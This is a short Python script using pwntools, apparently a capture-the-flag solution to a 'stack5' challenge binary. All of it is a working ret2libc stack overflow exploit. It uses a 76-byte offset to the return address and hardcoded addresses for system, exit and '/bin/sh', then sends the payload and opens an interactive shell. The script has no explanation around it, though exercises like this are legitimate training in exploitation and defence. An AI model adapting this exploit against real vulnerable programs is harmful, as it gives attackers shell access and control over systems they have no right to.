from pwn import *

#p = process('/problems/stack5r_1_f49e07369c5efe001a17891a845e5687/stack5')
#p.sendline(cyclic(256))
#p.wait()
#p.corefile

offset_ret = 76 #cyclic_find(p.corefile.fault_addr)
print("Return address at " + str(offset_ret))

print("Starting ret2libC")


exit_addr = 0xf7e1d160

system_addr = 0xf7e29f10

binsh_addr = 0xf7f689db

#exploit_str = b'A' * offset_ret + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)

exploit_str = flat({offset_ret:p32(system_addr)},
    p32(exit_addr),p32(binsh_addr))
p = process('/problems/stack5r_1_f49e07369c5efe001a17891a845e5687/stack5')
p.sendline(exploit_str)
p.interactive()
